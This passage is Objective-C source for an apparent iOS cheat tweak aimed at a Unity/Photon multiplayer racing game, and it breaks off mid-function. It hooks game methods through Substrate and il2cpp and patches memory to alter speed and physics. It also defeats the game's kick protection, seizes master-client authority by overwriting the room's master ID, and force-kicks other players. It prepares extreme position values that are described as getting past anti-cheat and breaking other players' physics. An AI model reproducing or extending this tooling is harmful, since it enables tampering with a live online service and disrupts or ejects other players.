    if (!g_hashtableClass || !g_mHashtableCtor || !g_mHashtableSetItem || !i_object_new || !i_runtime_invoke) return NULL;
    @try {
        void* ht = i_object_new(g_hashtableClass);
        if (!ht) return NULL;
        i_runtime_invoke(g_mHashtableCtor, ht, NULL, NULL);
        for (NSString *k in dict) {
            NSString *v = dict[k];
            void* args[2];
            args[0] = mkStr(k);
            args[1] = mkStr(v);
            if (args[0] && args[1]) {
                @try { i_runtime_invoke(g_mHashtableSetItem, ht, args, NULL); } @catch (...) {}
            }
        }
        return ht;
    } @catch (...) { return NULL; }
}

// v114.10: Photon.Realtime.Room API'sini isim ile bul (offset drift'e dayanikli).
// Hardcoded room_setCustomProperties offset'i (0x5916158) yeni Unity build'lerde
// PhotonNetwork.get_NickName'e sapiyor ve sifre yollamayi sessizce fail ediyor.
// Bu helper isim ile bulur, cached'ler.
static bool few1n_ensureRoomApi(void) {
    if (g_mRoomSetCustomProperties) return true;
    if (!i_class_from_name || !i_class_get_method_from_name) return false;
    if (!g_roomClass) g_roomClass = few1n_classAnyImage("Photon.Realtime", "Room");
    if (!g_roomClass) { FLog(@"⚠️ Photon.Realtime.Room class bulunamadi"); return false; }
    g_mRoomSetCustomProperties        = i_class_get_method_from_name(g_roomClass, "SetCustomProperties", 3);
    g_mRoomSetPropertiesListedInLobby = i_class_get_method_from_name(g_roomClass, "SetPropertiesListedInLobby", 1);
    if (!g_stringClass) g_stringClass = few1n_classAnyImage("System", "String");
    FLog([NSString stringWithFormat:@"🔑 Room API: cls=%p SetCP=%p SetPLIL=%p strCls=%p",
          g_roomClass, g_mRoomSetCustomProperties, g_mRoomSetPropertiesListedInLobby, g_stringClass]);
    return g_mRoomSetCustomProperties != NULL;
}

// il2cpp string[] uzunlugu 1, tek eleman = value. SetPropertiesListedInLobby(["pWd"]) icin.
// Array layout: header 0x10 + bounds 0x08 + max_length 0x08 = elemanlar 0x20'de baslar.
// Not: ptrOk() burada tanimli degil (dosyanin altinda); il2cpp_array_new/string_new
// basarisizsa NULL doner, o yuzden basit NULL kontrolu yeterli.
static void* mkStringArray1(NSString *value) {
    if (!i_array_new || !g_stringClass || !value) return NULL;
    void *arr = i_array_new(g_stringClass, 1);
    if (!arr) return NULL;
    void *s = mkStr(value);
    if (!s) return NULL;
    *((void**)((uintptr_t)arr + 0x20)) = s;
    return arr;
}

// v114.11: Boxed primitive'lerden C degerine cevir. il2cpp_runtime_invoke value type
// donderirse Il2CppObject header (0x10) + degerin kendisi. Wrapper'larda tekrar edecek.
static inline bool few1n_unboxBool(void *r) { return r && *(unsigned char*)((uintptr_t)r + 0x10) != 0; }
static inline int  few1n_unboxInt (void *r) { return r ? *(int*)((uintptr_t)r + 0x10) : 0; }

// v114.11 Faz 1a: Photon.Pun.PhotonNetwork / Photon.Realtime.Player class'larini
// isim ile bul (hardcoded offset drift'e karsi). Fonksiyon pointer'larimizi bu
// wrapper'larin adresine InstallEverything'te bind ediyoruz -> tum call site'lar
// hic degismeden calisir, sadece implementasyon degisir.
static void* few1n_pnClass(void) {
    static void* cls = NULL;
    if (!cls && i_class_from_name) cls = few1n_classAnyImage("Photon.Pun", "PhotonNetwork");
    return cls;
}
static void* few1n_playerClass(void) {
    static void* cls = NULL;
    if (!cls && i_class_from_name) cls = few1n_classAnyImage("Photon.Realtime", "Player");
    return cls;
}
static void* few1n_resolvePn(const char *methodName, int argc) {
    void *c = few1n_pnClass();
    if (!c || !i_class_get_method_from_name) return NULL;
    return i_class_get_method_from_name(c, methodName, argc);
}
static void* few1n_resolvePlayer(const char *methodName, int argc) {
    void *c = few1n_playerClass();
    if (!c || !i_class_get_method_from_name) return NULL;
    return i_class_get_method_from_name(c, methodName, argc);
}

static void* w_pn_getLocalPlayer(void) {
    static void *m = NULL; if (!m) m = few1n_resolvePn("get_LocalPlayer", 0);
    if (!m || !i_runtime_invoke) return NULL;
    @try { return i_runtime_invoke(m, NULL, NULL, NULL); } @catch (...) { return NULL; }
}
static void* w_pn_getCurrentRoom(void) {
    static void *m = NULL; if (!m) m = few1n_resolvePn("get_CurrentRoom", 0);
    if (!m || !i_runtime_invoke) return NULL;
    @try { return i_runtime_invoke(m, NULL, NULL, NULL); } @catch (...) { return NULL; }
}
static bool w_pn_getInRoom(void) {
    static void *m = NULL; if (!m) m = few1n_resolvePn("get_InRoom", 0);
    if (!m || !i_runtime_invoke) return false;
    @try { return few1n_unboxBool(i_runtime_invoke(m, NULL, NULL, NULL)); } @catch (...) { return false; }
}
static void* w_pn_getNickName(void) {
    static void *m = NULL; if (!m) m = few1n_resolvePn("get_NickName", 0);
    if (!m || !i_runtime_invoke) return NULL;
    @try { return i_runtime_invoke(m, NULL, NULL, NULL); } @catch (...) { return NULL; }
}
static bool w_ply_getIsMaster(void *self) {
    static void *m = NULL; if (!m) m = few1n_resolvePlayer("get_IsMasterClient", 0);
    if (!m || !i_runtime_invoke || !self) return false;
    @try { return few1n_unboxBool(i_runtime_invoke(m, self, NULL, NULL)); } @catch (...) { return false; }
}

// TMP_Text.richText = true  (Unity rich text acigini geri ac)
static void setRichTextIl(void* tmp, bool on) {
    if (!i_runtime_invoke || !g_mSetRichText || !tmp) return;
    bool val = on;
    void* params[1] = { &val };
    i_runtime_invoke(g_mSetRichText, tmp, params, NULL);
}

// Rigidbody ham Injected pointer'lari (rbGetVelIl/rbSetVelIl yedegi olarak kullanilir)
static void (*rb_getVel)(void* self, Vec3* out) = NULL;   // get_linearVelocity_Injected
static void (*rb_setVel)(void* self, Vec3* val) = NULL;   // set_linearVelocity_Injected
static void (*rb_getPos)(void* self, Vec3* out) = NULL;   // get_position_Injected
static void (*rb_setPos)(void* self, Vec3* val) = NULL;   // set_position_Injected

// Rigidbody linearVelocity - il2cpp runtime_invoke ile (ham offset degil)
static void rbGetVelIl(void* rb, Vec3* out) {
    out->x = out->y = out->z = 0;
    if (!rb) return;
    if (i_runtime_invoke && g_mRbGetVel) {
        void* box = i_runtime_invoke(g_mRbGetVel, rb, NULL, NULL);   // boxed Vector3
        if (box) { *out = *(Vec3*)((uintptr_t)box + 0x10); return; }
    }
    if (rb_getVel) rb_getVel(rb, out);   // yedek: ham Injected
}
static void rbSetVelIl(void* rb, const Vec3* v) {
    if (!rb) return;
    if (i_runtime_invoke && g_mRbSetVel) {
        void* params[1] = { (void*)v };
        i_runtime_invoke(g_mRbSetVel, rb, params, NULL);
        return;
    }
    if (rb_setVel) rb_setVel(rb, (Vec3*)v);     // yedek: ham Injected
}
static void rbSetAngVelIl(void* rb, const Vec3* v) {   // acisal hiz (ucusta yaw donme)
    if (!rb || !i_runtime_invoke || !g_mRbSetAngVel) return;
    void* params[1] = { (void*)v };
    i_runtime_invoke(g_mRbSetAngVel, rb, params, NULL);
}

// Rigidbody position - il2cpp runtime_invoke (ham cagri yedek)
static void rbGetPosIl(void* rb, Vec3* out) {
    out->x = out->y = out->z = 0;
    if (!rb) return;
    if (i_runtime_invoke && g_mRbGetPos) {
        void* box = i_runtime_invoke(g_mRbGetPos, rb, NULL, NULL);   // boxed Vector3
        if (box) { *out = *(Vec3*)((uintptr_t)box + 0x10); return; }
    }
    if (rb_getPos) rb_getPos(rb, out);
}
static void rbSetPosIl(void* rb, const Vec3* v) {
    if (!rb) return;
    if (i_runtime_invoke && g_mRbSetPos) {
        void* params[1] = { (void*)v };
        i_runtime_invoke(g_mRbSetPos, rb, params, NULL);
        return;
    }
    if (rb_setPos) rb_setPos(rb, (Vec3*)v);
}

static void setTimeScaleVal(float v) {
    if (!i_runtime_invoke || !g_mSetTS) return;
    float val = v;
    void* params[1] = { &val };
    i_runtime_invoke(g_mSetTS, NULL, params, NULL);
}
static float getTimeScaleVal(void) {
    if (!i_runtime_invoke || !g_mGetTS) return -1.0f;
    void* box = i_runtime_invoke(g_mGetTS, NULL, NULL, NULL);   // boxed float
    if (!box) return -1.0f;
    return *(float*)((uintptr_t)box + 0x10);                    // unbox
}


static NSString* readStr(void* il2s) {
    if (!il2s || (uintptr_t)il2s < 0x1000) return @"";
    @try {
        int32_t len = *(int32_t*)((uintptr_t)il2s + OFF_IL2CPP_STRING_LEN);
        if (len <= 0 || len > 4096) return @"";
        return [NSString stringWithCharacters:(unichar*)((uintptr_t)il2s + OFF_IL2CPP_STRING_CHARS) length:len];
    } @catch (...) { return @""; }
}
#include <signal.h>
#include <setjmp.h>

// v114.5: Gercek Crash Guard - sigjmp ile hata noktasini atlar
// __thread: her thread'in kendi jmpBuf/flag'i olsun -> baska thread'in siglongjmp'i
// yanlis stack'i unwind etmesin (aktif kullanim main thread'de ama guvenli tarafta kal).
static __thread sigjmp_buf few1n_jmpBuf;
static __thread volatile int few1n_inProtected = 0;
static volatile int few1n_signalCount = 0;

static void few1n_signalHandler(int sig, siginfo_t *info, void *ucontext) {
    few1n_signalCount++;
    if (few1n_inProtected) {
        siglongjmp(few1n_jmpBuf, sig);
    }
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = SIG_DFL;
    sigaction(sig, &sa, NULL);
    raise(sig);
}

static void few1n_setupCrashGuard(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = few1n_signalHandler;
    sa.sa_flags = SA_SIGINFO;
    sigfillset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
}

// Main-queue'ya X saniye sonra block gonder — dispatch_after boilerplate'ini kisalt.
static inline void few1n_after(double seconds, dispatch_block_t block) {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(seconds * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), block);
}

// @try/@catch(...) wrap'ini tek statement icin kisalt. Multi-statement veya
// ozel exception yakalamak icin manuel @try/@catch yaz.
#define FEW1N_SAFE(expr) do { @try { expr; } @catch (...) {} } while(0)

// Bir pointer okunabilir mi test et (crash-safe)
static inline bool few1n_memOk(void* p) {
    if ((uintptr_t)p < 0x1000) return false;
    few1n_inProtected = 1;
    volatile bool ok = false;
    if (sigsetjmp(few1n_jmpBuf, 1) == 0) {
        volatile uint8_t dummy = *(volatile uint8_t*)p;
        (void)dummy;
        ok = true;
    }
    few1n_inProtected = 0;
    return ok;
}

// Substrate calisiyor mu? Bagli sembol bos stub olabilir -> dlsym ile gercegini ara.
typedef void (*MSHookFn)(void*, void*, void**);
static MSHookFn g_msHook = NULL;
static bool g_msHookChecked = false;
static void few1n_probeSubstrate(void) {
    if (g_msHookChecked) return;
    g_msHookChecked = true;
    // Substrate / ElleKit / libhooker isimlerini sirayla dene
    g_msHook = (MSHookFn)dlsym(RTLD_DEFAULT, "MSHookFunction");
    if (g_msHook) { FLog([NSString stringWithFormat:@"Substrate VAR: MSHookFunction=%p", (void*)g_msHook]); return; }
    g_msHook = (MSHookFn)dlsym(RTLD_DEFAULT, "LHHookFunctions");   // libhooker
    if (g_msHook) { FLog(@"libhooker bulundu (LHHookFunctions)"); return; }
    void* ek = dlopen("/var/jb/usr/lib/libellekit.dylib", RTLD_LAZY);
    if (!ek) ek = dlopen("/usr/lib/libsubstrate.dylib", RTLD_LAZY);
    if (ek) {
        g_msHook = (MSHookFn)dlsym(ek, "MSHookFunction");
        FLog(g_msHook ? @"ElleKit/Substrate dylib ile yuklendi" : @"dylib acildi ama MSHookFunction yok");
        return;
    }
    FLog(@"SUBSTRATE YOK! Hicbir hook motoru bulunamadi -> il2cpp yolu kullaniliyor");
}

static bool g_hooksDead = false;   // ilk hook yazilamadiysa kalanlari deneme (temiz + hizli acilis)
static void safeHook(void* target, void* replacement, void** original, const char* name) {
    NSString* nm = [NSString stringWithUTF8String:name];
    if (!target) { FLog([@"SKIP (NULL) " stringByAppendingString:nm]); hookFailCount++; return; }
    // Bir kez basarisiz olduysa MSHookFunction'i tekrar cagirma - hepsi ayni motoru kullanir
    if (g_hooksDead) { hookFailCount++; return; }
    if (original) *original = NULL;
    few1n_probeSubstrate();
    // Ilk hookta base'in gercekten Mach-O basi olup olmadigini dogrula.
    // Base yanlissa hedef adres cop olur ve MSHookFunction sessizce basarisiz olur.
    static bool baseChecked = false;
    if (!baseChecked) {
        baseChecked = true;
        if (few1n_memOk((void*)global_base)) {
            uint32_t magic = *(uint32_t*)global_base;
            FLog([NSString stringWithFormat:@"Base kontrol: magic=0x%08X %@",
                  magic, (magic == 0xFEEDFACF) ? @"(GECERLI Mach-O)" : @"(GECERSIZ! base yanlis)"]);
        } else { FLog(@"Base okunamiyor - adres gecersiz"); }
        if (few1n_memOk(target)) {
            uint32_t insn = *(uint32_t*)target;
            FLog([NSString stringWithFormat:@"Hedef ilk komut: 0x%08X %@",
                  insn, (insn != 0 && insn != 0xFFFFFFFF) ? @"(kod gibi)" : @"(BOS! adres yanlis)"]);
        } else { FLog(@"Hedef okunamiyor - adres gecersiz"); }
    }
    if (g_msHook) g_msHook(target, replacement, original);   // dlsym ile bulunan gercek motor
    else MSHookFunction(target, replacement, original);      // bagli sembol (stub olabilir)
    // GERCEK dogrulama: MSHookFunction basarili olursa *original orijinal koda isaret eder.
    // Sideload'da (Substrate yok) MSHookFunction sessizce hicbir sey yapmaz -> *original NULL kalir.
    if (original && *original == NULL) {
        FLog([NSString stringWithFormat:@"FAIL (hook yazilamadi) %@", nm]);
        hookFailCount++;
        if (!g_hooksDead) { g_hooksDead = true; FLog(@">> Hooklar bu ortamda yazilamiyor, kalanlar atlaniyor. il2cpp yolu aktif."); }
        return;
    }
    FLog([NSString stringWithFormat:@"OK  %@", nm]);
    hookSuccessCount++;
}

// v114.19: Drift-immune safeHook — hedef adresi il2cpp isim ile bul.
// Hardcoded RVA yerine class+method lookup + il2cpp_method_get_pointer kullanir.
// Oyun her sürüm update'inde offset'ler kaysa bile isim korunuyorsa çalışır.
// Namespace bos "" ise tum image'lardan class taranir.
static void safeHookByName(const char* ns, const char* class_name, const char* method_name, int argc,
                            void* replacement, void** original, const char* label) {
    char logbuf[256];
    snprintf(logbuf, sizeof(logbuf), "%s [%s.%s(%d args)]",
             label ?: "", class_name ?: "?", method_name ?: "?", argc);
    if (!i_class_from_name || !i_class_get_method_from_name || !i_method_get_pointer) {
        FLog([NSString stringWithFormat:@"SKIP (il2cpp API yok) %s", logbuf]);
        hookFailCount++; return;
    }
    void* c = few1n_classAnyImage(ns ?: "", class_name);
    if (!c) {
        FLog([NSString stringWithFormat:@"SKIP (class YOK) %s", logbuf]);
        hookFailCount++; return;
    }
    void* m = i_class_get_method_from_name(c, method_name, argc);
    if (!m) {
        FLog([NSString stringWithFormat:@"SKIP (method YOK) %s", logbuf]);
        hookFailCount++; return;
    }
    void* addr = i_method_get_pointer(m);
    if (!addr) {
        FLog([NSString stringWithFormat:@"SKIP (code addr NULL) %s", logbuf]);
        hookFailCount++; return;
    }
    safeHook(addr, replacement, original, logbuf);
}

static UIWindow* getKeyWindow(void) {
    if (@available(iOS 15.0, *)) {
        for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive &&
                [scene isKindOfClass:[UIWindowScene class]]) {
                UIWindowScene *ws = (UIWindowScene *)scene;
                for (UIWindow *win in ws.windows) if (win.isKeyWindow) return win;
                if (ws.windows.count > 0) return ws.windows.firstObject;
            }
        }
    }
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
    UIWindow *w = [UIApplication sharedApplication].keyWindow;
#pragma clang diagnostic pop
    if (w) return w;
    NSArray<UIWindow *> *wins = [UIApplication sharedApplication].windows;
    for (UIWindow *win in wins) if (win.isKeyWindow) return win;
    return wins.firstObject;
}

// ===== FUNCTION POINTERS =====
static void* (*chatGetInst)(void) = NULL;
static void  (*chatSend)(void* self, void* msg) = NULL;
static void  (*tmp_set_text)(void* self, void* msg) = NULL;
static void* (*tmp_get_text)(void* self) = NULL;   // TMP_InputField.get_text
// v84: TMP_Text.set_richText — oda listesinde renk tag'larinin render edilmesi icin
static void  (*tmp_set_richText)(void* self, bool value) = NULL;   // 0x66017B8
static void* (*rinfo_getName)(void* self) = NULL;  // RoomInfo.get_Name (ham oda ismi)
static void  (*pn_setNickName)(void* name) = NULL;
static void* (*lobbyGetInst)(void) = NULL;
static void* (*playerManagerGetInst)(void) = NULL;
static void  (*pm_updateNicknameInternal)(void* self, void* newName) = NULL;
static int   (*pm_getMoney)(void* self) = NULL;
static void  (*pm_syncWithServer)(void* self) = NULL;
static void  (*pm_addMoney)(void* self, int amount) = NULL;
static void  (*lobby_createRoom)(void* self) = NULL;   // HR_PhotonLobbyManager.CreateRoomButton
static void  (*lobby_leaveRoom)(void* self) = NULL;    // HR_PhotonLobbyManager.LeaveRoom
static bool  (*pn_createRoom)(void* name, void* opts, void* lobby, void* users) = NULL; // PhotonNetwork.CreateRoom
static bool  (*pn_joinRoom)(void* name, void* users) = NULL;   // PhotonNetwork.JoinRoom 0x593A64C (goz at)
static bool  (*pn_getInRoom)(void) = NULL;                     // PhotonNetwork.get_InRoom 0x5934FA4 (oda tespiti)
static bool  (*pn_getConnReady)(void) = NULL;                  // PhotonNetwork.get_IsConnectedAndReady 0x59333A8 (oda kurma on-kosulu)
static void* (*pn_getCurrentRoom)(void) = NULL;               // PhotonNetwork.get_CurrentRoom 0x592DA0C
static void  (*room_setMaxPlayers)(void*, int) = NULL;        // Room.set_MaxPlayers 0x5927B70 (mevcut odayi buyut)
static int   (*room_getMaxPlayers)(void*) = NULL;             // Room.get_MaxPlayers 0x5927B68
static void  (*room_setIsOpen)(void*, bool) = NULL;           // Room.set_IsOpen 0x59279B0 (kilitli/acik)
static void  (*room_setIsVisible)(void*, bool) = NULL;        // Room.set_IsVisible 0x5927A90 (gorunur/gorunmez)
static bool  (*room_setCustomProperties)(void*, void*, void*, void*) = NULL;  // Room.SetCustomProperties 0x5916158 (sifre)
// oda durumu (kalici)
static bool  isRoomLocked = false;
static bool  isRoomInvisible = false;
static char  roomPasswordText[64] = "";
static void* g_fAutoSyncScene = NULL;   // PhotonNetwork.automaticallySyncScene static field (harita sync)
static void* (*pn_getNickName)(void) = NULL;                   // PhotonNetwork.get_NickName 0x59338C0 (isim kaydet)
static bool  (*pn_leaveRoom)(bool) = NULL;                     // PhotonNetwork.LeaveRoom 0x593B2D8 (goz at cikis)
static bool  (*pn_setMasterClient)(void* player) = NULL;       // PhotonNetwork.SetMasterClient
static bool  (*room_getIsOpen)(void*) = NULL;                  // Room.get_IsOpen 0x59279A8
static bool  (*room_getIsVisible)(void*) = NULL;               // Room.get_IsVisible 0x5927A88
// NOT: room_setIsOpen ve room_setIsVisible yukarida (874-875) tanimli — burada tekrar tanimlama.
static bool  (*pn_loadLevelStr)(void* name) = NULL;             // PhotonNetwork.LoadLevel(string) 0x5941D94
static bool  (*pn_loadLevelInt)(int index) = NULL;              // PhotonNetwork.LoadLevel(int) 0x5941B64
static void  (*hrMainStartRace)(void* self) = NULL;              // HR_MainMenuHandler.StartRace() 0x549130C
static void  (*unity_LoadSceneStr)(void* name) = NULL;           // UnityEngine.SceneManager.LoadScene(string) 0x6781268
static void  (*unity_LoadSceneInt)(int idx) = NULL;              // UnityEngine.SceneManager.LoadScene(int) 0x6781430
static void* (*pn_getActiveSceneName)(void) = NULL;             // SceneManagerHelper.get_ActiveSceneName 0x59618B0
static int   (*pn_getActiveSceneBuildIndex)(void) = NULL;        // SceneManagerHelper.get_ActiveSceneBuildIndex 0x5961920
// ==== ODADAKI OYUNCULAR (script.json dogrulandi) ====
static void* (*pn_getPlayerList)(void) = NULL;      // PhotonNetwork.get_PlayerList -> Player[]  0x59339D0
static void* (*pn_getPlayerListOthers)(void) = NULL; // PhotonNetwork.get_PlayerListOthers (kendisi haric) 0x5933B88
static void* (*pn_getLocalPlayer)(void) = NULL;     // PhotonNetwork.get_LocalPlayer 0x5933814 (master miyim kontrolu)
static void* (*ply_getNickName)(void*) = NULL;      // Player.get_NickName          0x5924574
static int   (*ply_getActorNumber)(void*) = NULL;   // Player.get_ActorNumber       0x592455C
static bool  (*ply_getIsMaster)(void*) = NULL;      // Player.get_IsMasterClient    0x5924640
static void* (*ply_getUserId)(void*) = NULL;        // Player.get_UserId            0x5924630
// HR_PhotonLobbyManager.EnableCarSelectionMenu() - oyun ici arac degistirme  0x54ABFD4
static void  (*lobby_carSelectMenu)(void*) = NULL;
static void  (*pn_raiseEvent)(unsigned char, void*, bool, void*) = NULL;
// ==== ARAC KONTROL PANELI (CarDriveSystem field offsetleri, il2cpp.h dogrulandi) ====
//  +0x60 overrideBrake(bool)  +0x61 overrideAcceleration(bool)  +0x62 overrideSteering(bool)
//  +0x64 overrideSteeringPower  +0x68 overrideBrakePower  +0x6C overrideAccelerationPower
//  +0x98 topSpeed  +0x9C currentSpeed
static bool  isCarPanelEnabled = false;
static float carAccelPower  = 3.0f;
static float carSteerPower  = 1.0f;
static float carTopSpeed    = 300.0f;
// UserId -> isim gecmisi. ActorNumber odadan cikinca degisir, UserId hesaba bagli kalir.
static NSMutableDictionary *g_playerDB = nil;
static void loadPlayerDB(void) {
    if (g_playerDB) return;
    NSDictionary *d = [[NSUserDefaults standardUserDefaults] objectForKey:@"few1n_playerDB"];
    g_playerDB = d ? [d mutableCopy] : [NSMutableDictionary dictionary];
}
static void savePlayerDB(void) {
    if (g_playerDB) {
        [[NSUserDefaults standardUserDefaults] setObject:g_playerDB forKey:@"few1n_playerDB"];
        [[NSUserDefaults standardUserDefaults] synchronize];
    }
}

// ===== HIZ TESHIS / YARDIMCILAR =====
static float (*ts_get)(void) = NULL;     // Time.get_timeScale
static Vec3 g_savedPos = {0,0,0};
static bool g_hasSavedPos = false;
static void* diagDrive = NULL;
static float diagCurSpd = 0, diagTopSpd = 0, diagVel = 0;
static long  fNitro = 0, fDrive = 0, fPlate = 0, fRoomLine = 0, fRccp = 0, fSmRCC = 0, fSmPUN = 0;  // hook tetiklenme sayaclari
static long  fTS = 0, fChat = 0, fCreateBtn = 0, fConn = 0;  // araba-disi hook sayaclari (base testi)
static long  fInput = 0;  // CarPlayerInput.FixedUpdate - GERCEK araba hooku
static float diagNitroVal = 0;
static float g_origTop = 0;
// extreme position/rotation values for exploit (valid IEEE float -> Photon Anti-Cheat does NOT kick, recipient PhysX breaks)
static Vec3 g_nanVec = {9999999.0f, 9999999.0f, 9999999.0f};
static Quaternion g_nanQuat = {99999.0f, 99999.0f, 99999.0f, 99999.0f};

// ===== TIME SCALE =====
static void (*o_setTimeScale)(float) = NULL;
static inline float targetScale(void) {
    // YENI: slider'daki gercek float carpani kullan (0.1x-10x)
    if (speedMult > 0.05f && speedMult != 1.0f) return speedMult;
    if (speedMode == 2) return 2.0f;
    if (speedMode == 3) return 3.0f;
    if (speedMode == 5) return 5.0f;
    return 1.0f;
}
static inline void enforceScale(void) {
    // iGameGod yontemi: il2cpp runtime_invoke ile set_timeScale (ham offset degil!)
    if (speedMult != 1.0f || speedMode > 1) {
        if (g_il2cppReady) setTimeScaleVal(targetScale());
        else if (o_setTimeScale) o_setTimeScale(targetScale());  // yedek
    }
}
static void h_setTimeScale(float v) {
    fTS++;
    // Oyun timeScale'i 1'e resetlemeye calisirsa bizim degeri zorla (slider dahil)
    if (speedMult != 1.0f || speedMode > 1) v = targetScale();
    if (o_setTimeScale) o_setTimeScale(v);
}

// ===== ANTI-KICK & OYUNCU ATMA =====
static bool g_isManualKick = false;
static bool (*o_closeConnection)(void*) = NULL;
static bool (*pn_closeConnection)(void*) = NULL;   // PhotonNetwork.CloseConnection DIREKT (hook olmadan) 0x5938844
static bool h_closeConnection(void* kickPlayer) {
    fConn++;
    if (g_isManualKick) return o_closeConnection ? o_closeConnection(kickPlayer) : false;
    return false; // Anti-kick: baskalari seni atamasin
}
// EnableCloseConnection'i her kick oncesi TRUE zorla (oyun oda girisinde sifirlayabilir)
static void few1n_forceEnableKick(void) {
    if (g_fEnableCloseConn && i_field_static_set_value) {
        @try { bool t = true; i_field_static_set_value(g_fEnableCloseConn, &t); } @catch (...) {}
    }
}
// TUM ODA ISLEMLERINDE OTOMATIK MASTER CLIENT YETKISI AL (Her özellikte yönetici ol)
// Iki yontem birden dener:
//  A) PhotonNetwork.SetMasterClient(me) - Photon'un standart yolu (CAS check yapar)
//  B) Client-side memory patch (Room + 0x48 = masterClientId) - UI/local durum icin
// Eger A sunucu tarafinda reddedilirse client B sayesinde kendini master gorur (yerel isler calisir).
static inline void few1n_claimMaster(void) {
    if (isMasterClaimDisabled) return;   // v70 klasik davranis: hicbir sey yapma
    if (pn_getLocalPlayer && pn_getCurrentRoom) {
        @try {
            void* me = pn_getLocalPlayer();
            void* room = pn_getCurrentRoom();
            if (me && room) {
                // A) Once server'a SetMasterClient gonder (CAS icin gercek eski master ID'si lazim)
                if (pn_setMasterClient) {
                    @try { pn_setMasterClient(me); } @catch (...) {}
                }
                // B) Client-side memory patch: ActorNumber = offset 0x18, MasterClientId = offset 0x48
                int myActor = *(int*)((uintptr_t)me + 0x18);
                *(int*)((uintptr_t)room + 0x48) = myActor;
            }
        } @catch (...) {}
    }
}
// Forward declarations (tanimlari asagida; burada erken kullanimlar icin)
static inline bool ptrOk(void* p);
static inline bool unityAlive(void* obj);
// DOGRU lobi yoneticisini bul: PhotonView'i OLAN instance (yoksa KickPlayer RPC'den once patlar).
static void* few1n_findLobbyMgr(void) {
    if (!g_lobbyDummyType || !g_mFindObjectsPlural || !i_runtime_invoke) return NULL;
    @try {
        void* a[1]; a[0] = g_lobbyDummyType;
        void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
        if (!ptrOk(arr)) return NULL;
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        if (cnt <= 0 || cnt > 32) return NULL;
        void** insts = (void**)((uintptr_t)arr + 0x20);
        void* fallback = NULL;
        for (int i = 0; i < cnt; i++) {
            void* inst = insts[i]; if (!unityAlive(inst)) continue;
            if (!fallback) fallback = inst;
            if (mbp_getPhotonView) {
                void* pv = NULL; @try { pv = mbp_getPhotonView(inst); } @catch (...) {}
                if (ptrOk(pv)) return inst;   // photonView'li instance -> RPC gercekten gider
            }
        }
        return fallback;   // hicbirinde yoksa ilkini dene
    } @catch (...) { return NULL; }
}
static void few1n_kickPlayer(void* playerObj) {
    if (!playerObj) return;
    @try {
        few1n_forceEnableKick();

        // Hedef ActorNumber'ı al (pointer karşılaştırması yerine ActorNumber kullan)
        int targetActor = ply_getActorNumber ? ply_getActorNumber(playerObj) : -1;
        void* nmeStr = ply_getNickName ? ply_getNickName(playerObj) : NULL;
        NSString *targetNick = ptrOk(nmeStr) ? readStr(nmeStr) : nil;
        FLog([NSString stringWithFormat:@"🎯 Hedef: '%@' (Actor=%d, ptr=%p)", targetNick ?: @"?", targetActor, playerObj]);

        // 1. OTOMATIK MASTER CLIENT YETKISI AL (Sunucunun kick reddetmesini engeller)
        if (pn_getLocalPlayer && pn_setMasterClient) {
            void* me = pn_getLocalPlayer();
            if (me) {
                pn_setMasterClient(me);
                FLog(@"  → Master client yetkisi istendi");
            }
        }

        // 2. EnableCloseConnection'ı TEKRAR zorla (oyun resetlemiş olabilir)
        few1n_forceEnableKick();

        // 3. PUN2 CloseConnection (Doğrudan Photon Kick)
        // Hook varsa o_closeConnection orijinali çağırır; yoksa pn_closeConnection direkt çağırır
        bool kicked = false;
        if (o_closeConnection) {
            g_isManualKick = true;
            @try { kicked = o_closeConnection(playerObj); } @catch (...) {}
            g_isManualKick = false;
            FLog([NSString stringWithFormat:@"  → CloseConnection (orig): %@", kicked ? @"BAŞARILI ✓" : @"BAŞARISIZ (master değilsin?)"]);
        } else if (pn_closeConnection) {
            g_isManualKick = true;
            @try { kicked = pn_closeConnection(playerObj); } @catch (...) {}
            g_isManualKick = false;
            FLog([NSString stringWithFormat:@"  → CloseConnection (direkt): %@", kicked ? @"BAŞARILI ✓" : @"BAŞARISIZ"]);
        } else {
            FLog(@"  → CloseConnection: POINTER YOK (hook+fn ikisi de NULL)");
        }

        // 4. Oyunun kendi Lobi RPC Kick mekanizması (LobbyManagerDummy.KickPlayer)
        if (g_lobbyDummyType && g_mFindObjectsPlural && i_runtime_invoke && g_mDummyKick && ptrOk(nmeStr)) {
            void* mgr = few1n_findLobbyMgr();
            if (unityAlive(mgr)) {
                *(void**)((uintptr_t)mgr + 0x108) = nmeStr;
                @try {
                    i_runtime_invoke(g_mDummyKick, mgr, NULL, NULL);
                    FLog(@"  → Lobby RPC KickPlayer gönderildi ✓");
                } @catch (...) { FLog(@"  → Lobby RPC kick HATA"); }
            } else {
                FLog(@"  → Lobby RPC: Manager bulunamadı (PhotonView'li instance yok)");
            }
        } else {
            FLog(@"  → Lobby RPC kick: Gerekli pointer(lar) hazır değil");
        }

        // 5. Hedef oyuncunun PhotonView/CPS nesnesine özel Teleport RPC Düşürme paketi
        //    DÜZELTME: Pointer karşılaştırması yerine ActorNumber karşılaştırması kullan
        bool rpcSent = false;
        if (g_photonViewType && g_pvOwnerOff > 0 && g_mFindObjectsPlural && i_runtime_invoke && targetActor > 0) {
            void* b2[1]; b2[0] = g_photonViewType;
            void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, b2, NULL);
            if (ptrOk(arr)) {
                int c = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
                void** pvs = (void**)((uintptr_t)arr + 0x20);
                for (int i = 0; i < c && i < 128; i++) {
                    void* pv = pvs[i]; if (!unityAlive(pv)) continue;
                    void* owner = *(void**)((uintptr_t)pv + g_pvOwnerOff);
                    if (!ptrOk(owner)) continue;
                    // ActorNumber karşılaştırması (güvenilir, pointer değişse bile çalışır)
                    int ownerActor = ply_getActorNumber ? ply_getActorNumber(owner) : -2;
                    if (ownerActor == targetActor) {
